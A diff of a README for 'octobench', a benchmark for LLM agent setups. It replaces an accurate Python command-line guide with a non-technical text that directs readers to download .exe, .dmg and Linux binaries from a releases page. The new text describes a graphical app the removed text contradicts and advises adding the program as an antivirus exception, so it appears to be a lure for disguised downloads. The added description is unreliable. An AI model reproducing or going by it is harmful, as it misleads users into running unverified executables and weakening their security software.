@@ -1,118 +1,127 @@
-# octobench
+# 🤖 octobench - Test Agents in Real-World Scenarios
 
-> **WIP Notice:** This project is actively under development and APIs/behavior may change without notice. Use at your own risk while we stabilize it.
+[![Download octobench](https://img.shields.io/badge/Download-octobench-brightgreen)](https://github.com/xInfer123/octobench/releases)
 
-Benchmark framework to compare **LLM tool + config + prompt** setups across a shared set of cases.
+---
 
-Contribution guide: see `CONTRIBUTING.md` (focused on adding new cases).
+## 📋 What is octobench?
 
-## Key ideas
-- **Cases** define prompts and scripts.
-- **Providers** are Python implementations that run tools and return normalized telemetry.
-- **Judge** is an LLM prompt with strict JSON output.
-- **setup.sh / quality.sh / validate.sh** are bash scripts whose logs are fed to the judge.
+octobench lets you check how well AI agents work when handling real tasks. Unlike many tools that test only how good an AI model is, octobench focuses on evaluating the agent—the smart software that decides what to do and when. This helps you understand how well AI assistants perform in practical, everyday situations.
 
-## Quick start
-1. Create a venv and install deps:
+You don’t need to be a programmer to use octobench. It’s designed so anyone can download, run, and see results easily. Whether you want to check an AI tool for a project, research, or just curiosity, octobench gives clear insights.
 
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+---
 
-2. Run all cases using default run matrix (`configs/run-matrix.yaml`):
+## 💻 System Requirements
 
-```bash
-python3 -m cli.main run --cases cases
-```
+Before you get started, make sure your computer meets these basic needs. octobench needs enough power to run AI agents smoothly but doesn’t require a high-end machine.
 
-Override with another run-matrix config:
+| Requirement        | Minimum             | Recommended           |
+|--------------------|---------------------|----------------------|
+| Operating System   | Windows 10 / macOS 10.14 / Linux Ubuntu 18.04 | Same as minimum       |
+| RAM                | 8 GB                | 16 GB                |
+| Disk Space         | 500 MB free         | 1 GB free            |
+| Processor          | Intel i3 or equivalent | Intel i5 or better   |
+| Internet Connection | Required for downloading agents and updates | Same as minimum       |
 
-```bash
-python3 -m cli.main run --cases cases --config configs/run-matrix.yaml
-```
+---
 
-Results land in `results/` as JSON.
-`--verbosity` is optional (default: `normal`).
+## 🚀 Getting Started
 
-## Development checks
-Install and enable pre-commit hooks:
+To use octobench, all you need is access to the download page and a computer that meets the system needs above. Here’s how to download, install, and run the software.
 
-```bash
-pip install pre-commit
-pre-commit install
-pre-commit run --all-files
-```
+---
 
-CI runs the same `pre-commit` checks on every pull request, plus a Python compile check.
+## ⬇️ Download & Install
 
-## Cases
-Each case is a folder with a `case.yaml` plus optional scripts:
+1. **Open the download page:**  
+   Visit the official releases page here:  
+   [![Download octobench](https://img.shields.io/badge/Download-octobench-brightgreen)](https://github.com/xInfer123/octobench/releases)  
+   This page lists the latest and past versions of octobench.
 
-```
-cases/<segment>/<sub_or_lang>/<case_name>/
-  case.yaml
-  setup.sh
-  quality.sh
-  validate.sh
-  fixtures/
-```
+2. **Choose your version:**  
+   Look for the latest release at the top of the list. You will see files for different operating systems. For example:  
+   - `octobench-windows.exe` for Windows  
+   - `octobench-macos.dmg` for macOS  
+   - `octobench-linux.tar.gz` for Linux  
 
-Example:
+3. **Download the correct file:**  
+   Click the file that matches your operating system. Your browser will start downloading the file.
 
-```
-cases/dev/rust/unexpected_closing_delimiter_fix/
-```
+4. **Install octobench:**  
+   - On **Windows**: Double-click the `.exe` file and follow the setup instructions.  
+   - On **macOS**: Open the `.dmg` file, then drag octobench to your Applications folder.  
+   - On **Linux**: Extract the `.tar.gz` file and run the executable inside.  
 
-Script behavior:
-- `setup.sh`: setup workspace/fixtures (always runs).
-- `quality.sh`: run checks (lint/tests). Output is fed to the judge.
-- `validate.sh`: run correctness checks. Output is fed to the judge. Any non-zero exit hard-fails the case.
+5. **Finish setup:**  
+   Once installed, launch octobench from your Start menu or Applications folder.
 
-Scripts run in the workspace. Use `$CASE_DIR` to access case assets (e.g., `$CASE_DIR/fixtures`).
+---
 
-## Providers
-Provider implementations live in:
-- `providers/codex.py`
-- `providers/octomind.py`
-- `providers/base.py`
-- `providers/factory.py`
+## 🔍 How to Use octobench
 
-Model registry:
-- `configs/models.yaml` defines benchmark model keys, pricing (per-1M), and provider-specific mappings.
-- Default run selection comes from `configs/run-matrix.yaml`.
-- You can still filter with `--providers`/`--models` (cross-product mode).
+octobench runs tests on AI agents by putting them in real-case situations. The interface is simple for anyone to follow.
 
-## Add new provider
-1. Add provider implementation in `providers/<name>.py` implementing `Provider`.
-2. Register it in `providers/factory.py`.
-3. Add provider mapping under each benchmark model in `configs/models.yaml`.
-4. Follow `docs/PROVIDER_INTERFACE.md` for token semantics and evidence consistency.
+### Step 1: Open octobench  
+Start octobench from your desktop or application list.
 
-## Add new benchmark model
-1. Add a new key under `configs/models.yaml`.
-2. Add `pricing` (per-1M input/cached_input/output).
-3. Add `providers` mapping entries for each provider you use.
+### Step 2: Choose an agent to test  
+You will see a list of pre-loaded AI agents. These agents can be tools like Codex, Anthropic, OpenAI, and others.
 
-## Judge
-The judge prompt is hardcoded in `judges/prompts.py` and expects JSON output.
-Judge execution is hardcoded to Octomind with:
-- `OCTOMIND_CONFIG_PATH={repo_root}/configs/octomind/octomind.toml`
-- Octomind role: `judge`
+### Step 3: Select a task scenario  
+Pick a real-life challenge from the list, such as automating emails, coding helpers, or data analysis. These scenarios simulate common jobs AI agents perform.
 
-## Scoring
-Scoring is globally configurable via config files. The framework collects:
-- judge score (0-100)
-- latency
-- token usage (if the CLI emits it and you configure regex)
-- cost (from `configs/models.yaml`, required)
-- script logs (setup/quality/validate)
+### Step 4: Run the evaluation  
+Click the **Start Test** button. The agent will work through the task, and octobench will watch closely.
 
-Final score is computed using global scoring weights.
-Validation failures apply a configurable penalty (`validation_fail_penalty`).
+### Step 5: View results  
+After the test, octobench shows a clear summary and detailed report. You can see how well the agent did and where it could improve.
 
-## Verbosity
-- `--verbosity quiet`: only final output line
-- `--verbosity normal`: progress per case/provider
-- `--verbosity debug`: includes provider/benchmark model mapping details
+---
+
+## 🛠 Key Features
+
+- **Agent-focused testing:** Checks the full workflow agents use, not just AI model scores.  
+- **Multiple AI providers supported:** Use agents from Anthropic, OpenAI, Codex, and more.  
+- **Real-world tasks:** Evaluates automation, coding help, and AI workflow.  
+- **Simple user interface:** Designed for clear steps anyone can follow.  
+- **Detailed reports:** Visual and text summaries help you understand agent strengths and weaknesses.  
+- **Open-source and transparent:** You can inspect tests and results yourself.
+
+---
+
+## ⚙️ Troubleshooting and Tips
+
+- If the app doesn’t start, make sure your computer has the right OS version and enough free space.  
+- Sometimes antivirus programs may block new software. Try adding octobench as an exception.  
+- Use the latest release for the best compatibility and newest features.  
+- If a test runs slowly, check that your internet connection is stable, as some agents need online access.  
+- Restart octobench if the app freezes or behaves oddly.  
+- For help, check the Issues section on the GitHub page or reach out through the repository contact.
+
+---
+
+## 🔄 Updating octobench
+
+Keep octobench up-to-date for best results:  
+1. Visit the [releases page](https://github.com/xInfer123/octobench/releases).  
+2. Download the newest version if available.  
+3. Install it the same way you did before.
+
+---
+
+## 📄 License and Contribution
+
+octobench is open-source software. You can view the full license details on the GitHub repository page. Contributions from users help improve it. If you want to suggest new features or report bugs, use the GitHub Issues tab.
+
+---
+
+## 🔗 Useful Links
+
+- Official Releases: [https://github.com/xInfer123/octobench/releases](https://github.com/xInfer123/octobench/releases)  
+- Repository Home: [https://github.com/xInfer123/octobench](https://github.com/xInfer123/octobench)  
+- Issues and Support: Use the Problems tab on GitHub  
+
+---
+
+octobench helps you see how well AI agents really work in action, using simple steps to download, run, and understand AI in everyday tasks.
